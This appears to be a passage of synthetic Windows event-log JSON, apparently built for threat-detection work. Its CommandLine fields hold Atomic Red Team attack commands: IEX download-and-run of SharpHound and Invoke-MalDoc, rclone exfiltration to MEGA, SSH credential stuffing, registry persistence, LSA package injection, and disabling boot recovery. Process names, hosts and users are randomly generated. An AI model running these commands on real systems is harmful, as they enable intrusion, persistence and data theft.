        "CommandLine": "\"$registryPath = \\\"HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Windows Defender Exploit Guard\\\\ASR\\\\Rules\\\"\\n\\nif (-not (Test-Path $registryPath)) {\\n    New-Item -Path $registryPath -Force\\n    Write-Host \\\"Registry key created: $registryPath\\\"\\n}\\n\\n$newValueName = \\\"36190899-1602-49e8-8b27-eb1d0a1ce869\\\"\\n$newValueData = \\\"1\\\"\\nNew-ItemProperty -Path $registryPath -Name $newValueName -PropertyType String -Value $newValueData -Force\\nWrite-Host \\\"Registry value created: $newValueName with data $newValueData\\\"\\n\\nRemove-ItemProperty -Path $registryPath -Name $newValueName\\nWrite-Host \\\"Registry value deleted: $newValueName\\\"\",",
        "LogonID": 479752,
        "LogonGuid": "a744a567-1c44-4de0-8dbb-bf59ae94e132",
        "SourceProcessID": 5734,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\simple..dll",
        "DestinationProcessID": 9960,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\top..dll",
        "UtcTime": "2024-05-17T01:36:51.650074Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-71.holloway.com",
        "User": "ihernandez",
        "ProcessID": 2553,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Mount-DiskImage -ImagePath \\\"#{path_of_iso}\\\" -StorageType ISO -Access ReadOnly\\n$keep = Get-Volume -FileSystemLabel \\\"AllTheThings\\\"\\n$driveLetter = ($keep | Get-Volume).DriveLetter\\n$instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(\\\"{c08afd90-f2a1-11d1-8455-00a0c91f3880}\\\"))\\n$instance.Document.Application.ShellExecute($driveLetter+\\\":\\\\document.lnk\\\",\\\"\\\",$driveLetter+\\\":\\\\\\\",$null,0)\\n\",",
        "LogonID": 326382,
        "LogonGuid": "3a73fc04-d9e7-4d5e-875a-17b96b8d14ac",
        "SourceProcessID": 3779,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\address..exe",
        "DestinationProcessID": 3737,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\responsibility..exe",
        "UtcTime": "2024-05-17T01:36:51.650074Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-33.garcia.com",
        "User": "travislane",
        "ProcessID": 1462,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"#{regsvr32path}\\\\#{regsvr32name} /s /u /i:\\\"#{filename}\\\" scrobj.dll\\n\",",
        "LogonID": 379713,
        "LogonGuid": "a83124a2-577a-43d0-966e-250ddf2cd9c6",
        "SourceProcessID": 7265,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\skill..exe",
        "DestinationProcessID": 8428,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\big..exe",
        "UtcTime": "2024-05-17T01:36:51.650074Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-29.sullivan.info",
        "User": "nicholasjones",
        "ProcessID": 9311,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Copy-Item \\\"$PathToAtomicsFolder\\\\T1547.002\\\\bin\\\\package.dll\\\" C:\\\\Windows\\\\System32\\\\\\nreg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\" /v \\\"Authentication Packages\\\" /t REG_MULTI_SZ /d \\\"msv1_0\\\\0package.dll\\\" /f\\n\",",
        "LogonID": 375745,
        "LogonGuid": "99c116e0-a305-48ec-996c-09217cf5190e",
        "SourceProcessID": 1801,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\himself..dll",
        "DestinationProcessID": 8251,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\list..exe",
        "UtcTime": "2024-05-17T01:36:51.651070Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-48.black.com",
        "User": "kyle79",
        "ProcessID": 2955,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"net.exe start >> #{output_file}\\n\",",
        "LogonID": 578842,
        "LogonGuid": "9ee5df51-deca-441e-abb3-9d1babcd71b6",
        "SourceProcessID": 5487,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\four..dll",
        "DestinationProcessID": 8876,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\character..dll",
        "UtcTime": "2024-05-17T01:36:51.651070Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-36.hernandez.com",
        "User": "umoore",
        "ProcessID": 6310,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"import-module msonline\\n$Password = ConvertTo-SecureString -String \\\"#{password}\\\" -AsPlainText -Force\\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $Password\\nConnect-MsolService -Credential $Credential\\n$users = Get-MsolUser -All;\\nforeach($user in $users)\\n{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; \\nforeach($prop in $props)\\n{if($user.$prop -like \\\"*password*\\\")\\n{(\\\"[*]\\\" + $user.UserPrincipalName + \\\"[\\\" + $prop + \\\"]\\\" + \\\" : \\\" + $user.$prop) | out-file -filepath $env:temp\\\\T1552.005Test1.txt -append -force}}}\\nget-content -path $env:temp\\\\T1552.005Test1.txt -erroraction silentlycontinue\\n\",",
        "LogonID": 281775,
        "LogonGuid": "c75adadf-c91d-4e7c-96e7-0d75ca2df32a",
        "SourceProcessID": 2584,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\better..exe",
        "DestinationProcessID": 5070,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\successful..exe",
        "UtcTime": "2024-05-17T01:36:51.651070Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-04.stone.net",
        "User": "sarahcarlson",
        "ProcessID": 3909,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"passwd #{user_account} #enter admin password > enter new password > confirm new password\\n\",",
        "LogonID": 487325,
        "LogonGuid": "2e2b2a0a-f3fa-4cab-9f22-22c2e710521f",
        "SourceProcessID": 3288,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\alone..exe",
        "DestinationProcessID": 7107,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\budget..dll",
        "UtcTime": "2024-05-17T01:36:51.651070Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-91.benton.com",
        "User": "smitheddie",
        "ProcessID": 6191,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"write-host \\\"Remote download of SharpHound.ps1 into memory, followed by execution of the script\\\" -ForegroundColor Cyan\\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\\nInvoke-BloodHound -OutputDirectory $env:Temp\\nStart-Sleep 5\\n\",",
        "LogonID": 242542,
        "LogonGuid": "b67085fe-b5b8-4526-b03f-e01389c3b70c",
        "SourceProcessID": 8189,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\mind..exe",
        "DestinationProcessID": 2382,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\among..exe",
        "UtcTime": "2024-05-17T01:36:51.651070Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-43.rodriguez.net",
        "User": "margaret57",
        "ProcessID": 1453,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\\nbcdedit.exe /set {default} recoveryenabled no\\n\",",
        "LogonID": 310797,
        "LogonGuid": "451822a0-2406-4067-8094-80723bed0e05",
        "SourceProcessID": 6599,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\government..exe",
        "DestinationProcessID": 6680,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\where..dll",
        "UtcTime": "2024-05-17T01:36:51.651070Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-90.jones.com",
        "User": "bowenbrandy",
        "ProcessID": 9985,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$input_table = \\\"#{parent_list}\\\".split(\\\",\\\")\\n$Name = \\\"Debugger\\\"\\n$Value = \\\"#{attached_process}\\\"\\nForeach ($item in $input_table){\\n  $item = $item.trim()\\n  $registryPath = \\\"HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\$item\\\"\\n  IF(!(Test-Path $registryPath))\\n  {\\n    New-Item -Path $registryPath -Force\\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\\n  }\\n  ELSE\\n  {\\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\\n  }\\n}\\n\",",
        "LogonID": 861335,
        "LogonGuid": "b4a427e1-ed32-4663-a4be-bc62fad3b0b8",
        "SourceProcessID": 8057,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\job..exe",
        "DestinationProcessID": 1909,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\behavior..dll",
        "UtcTime": "2024-05-17T01:36:51.652069Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-64.nunez.com",
        "User": "coopershannon",
        "ProcessID": 3414,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$wdApp = New-Object -COMObject \\\"Word.Application\\\"\\nif(-not $wdApp.path.contains(\\\"Program Files (x86)\\\"))  \\n{\\n  Write-Host \\\"64-bit Office\\\"\\n  reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office test\\\\Special\\\\Perf\\\" /t REG_SZ /d \\\"PathToAtomicsFolder\\\\T1137.002\\\\bin\\\\officetest_x64.dll\\\" /f       \\n}\\nelse{\\n  Write-Host \\\"32-bit Office\\\"\\n  reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office test\\\\Special\\\\Perf\\\" /t REG_SZ /d \\\"PathToAtomicsFolder\\\\T1137.002\\\\bin\\\\officetest_x86.dll\\\" /f\\n}\\nStop-Process -Name \\\"WinWord\\\" \\nStart-Process \\\"WinWord\\\"\\n\",",
        "LogonID": 286700,
        "LogonGuid": "5f80b0c1-0398-4249-b4f8-a5f504266f66",
        "SourceProcessID": 9283,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\reflect..exe",
        "DestinationProcessID": 1161,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\operation..dll",
        "UtcTime": "2024-05-17T01:36:51.652069Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-72.jones.net",
        "User": "john52",
        "ProcessID": 2397,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"New-Item -Path 'HKCU:\\\\SOFTWARE\\\\Classes\\\\CLSID\\\\#{clsid}' -Value '#{clsid_description}'\\nNew-Item -Path 'HKCU:\\\\SOFTWARE\\\\Classes\\\\CLSID\\\\#{clsid}\\\\InprocServer32' -Value \\\"#{dllpath}\\\"\\nNew-ItemProperty -Path 'HKCU:\\\\SOFTWARE\\\\Classes\\\\CLSID\\\\#{clsid}\\\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \\\"String\\\"\\nStart-Process -FilePath \\\"C:\\\\Windows\\\\System32\\\\RUNDLL32.EXE\\\" -ArgumentList '-sta #{clsid}'\",",
        "LogonID": 316122,
        "LogonGuid": "89bbb5fb-acce-4309-ace3-0a8420d4924e",
        "SourceProcessID": 1669,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\growth..dll",
        "DestinationProcessID": 6414,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\image..dll",
        "UtcTime": "2024-05-17T01:36:51.652069Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-57.lewis-kramer.info",
        "User": "dennis67",
        "ProcessID": 7721,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"New-ItemProperty \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\" -Name T1112 -Value \\\"<script>\\\"\\n\",",
        "LogonID": 196202,
        "LogonGuid": "1c73257a-bc51-4e05-ab2d-13cea7603eba",
        "SourceProcessID": 3069,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\former..dll",
        "DestinationProcessID": 1822,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\society..dll",
        "UtcTime": "2024-05-17T01:36:51.652069Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-78.thompson-lee.com",
        "User": "petersenraymond",
        "ProcessID": 7560,
        "ProcessName": "malware.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing) \\nInvoke-Maldoc -macroFile \\\"PathToAtomicsFolder\\\\T1059.005\\\\src\\\\T1059_005-macrocode.txt\\\" -officeProduct \\\"Word\\\" -sub \\\"Extract\\\"\\n\",",
        "LogonID": 285273,
        "LogonGuid": "387f0a1e-21d2-48b2-85d2-456bbd46cf25",
        "SourceProcessID": 5344,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\blue..dll",
        "DestinationProcessID": 6780,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\consider..exe",
        "UtcTime": "2024-05-17T01:36:51.652069Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-88.walton.com",
        "User": "mendezpatty",
        "ProcessID": 2151,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"\\\"\\\"%PROGRAMFILES%\\\\dcrypt\\\"\\\\#{dcrypt_exe}\\\"\\n\",",
        "LogonID": 755500,
        "LogonGuid": "16a30acd-0129-4d93-927e-6445d46df275",
        "SourceProcessID": 7218,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\his..dll",
        "DestinationProcessID": 6354,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\maybe..dll",
        "UtcTime": "2024-05-17T01:36:51.653070Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-80.berger.com",
        "User": "manuelgoodman",
        "ProcessID": 2336,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"\\\"#{Path_to_file}\\\" 1>NUL \\n\",",
        "LogonID": 629514,
        "LogonGuid": "33c12daf-d583-44f2-9ccb-8fb900cfa415",
        "SourceProcessID": 6646,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\plant..dll",
        "DestinationProcessID": 3566,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\condition..exe",
        "UtcTime": "2024-05-17T01:36:51.653070Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-19.hobbs.com",
        "User": "rodriguezlaura",
        "ProcessID": 3539,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"New-Item #{rclone_config_path}\\\\rclone -ItemType directory\\nNew-Item #{rclone_config_path}\\\\rclone\\\\rclone.conf\\ncd \\\"#{rclone_path}\\\"\\n.\\\\rclone.exe config create #{remote_share} mega\\nset-Content #{rclone_config_path}\\\\rclone\\\\rclone.conf \\\"[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}\\\"\\n.\\\\rclone.exe copy --max-size 1700k \\\"#{dir_to_copy}\\\" #{remote_share}:test -v\\n\",",
        "LogonID": 477137,
        "LogonGuid": "bc55e401-a831-435c-a1de-b8912aa5ee02",
        "SourceProcessID": 5287,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\way..dll",
        "DestinationProcessID": 4123,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\perhaps..exe",
        "UtcTime": "2024-05-17T01:36:51.653070Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-67.richards.biz",
        "User": "athomas",
        "ProcessID": 2313,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/\\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\\\":\\\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\\\":\\\" -f1`@#{target_host};done\\n\",",
        "LogonID": 367153,
        "LogonGuid": "be2df310-6fb7-41ad-b0be-eae9b07ce6ef",
        "SourceProcessID": 5168,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\rich..exe",
        "DestinationProcessID": 4660,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\building..exe",
        "UtcTime": "2024-05-17T01:36:51.653070Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-93.foley-tran.com",
        "User": "mary61",
        "ProcessID": 7171,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"New-Item \\\"HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Active Setup\\\\Installed Components\\\" -Name \\\"atomic_test\\\" -Force\\nSet-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Active Setup\\\\Installed Components\\\\atomic_test\\\" \\\"(Default)\\\" \\\"ART TEST\\\" -Force\\nSet-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Active Setup\\\\Installed Components\\\\atomic_test\\\" \\\"StubPath\\\" \\\"#{payload}\\\" -Force \\n& $env:SYSTEMROOT\\\\system32\\\\runonce.exe /AlternateShellStartup\",",
        "LogonID": 897641,
        "LogonGuid": "9bf7cfb1-ad1b-4ba4-a992-307ea47e0810",
        "SourceProcessID": 4373,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\activity..dll",
        "DestinationProcessID": 1197,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\want..dll",
        "UtcTime": "2024-05-17T01:36:51.654074Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-66.clark.com",
        "User": "qbeasley",
        "ProcessID": 2324,
        "ProcessName": "malware.exe",
        "CommandLine": "\"for %i in (C$ IPC$ ADMIN$) do net share %i /delete\",",
        "LogonID": 931404,
        "LogonGuid": "9b8ebd7a-1922-4645-b0ca-c6008de30c40",
        "SourceProcessID": 9392,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\mother..dll",
        "DestinationProcessID": 4356,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\and..dll",
        "UtcTime": "2024-05-17T01:36:51.654074Z"
    },
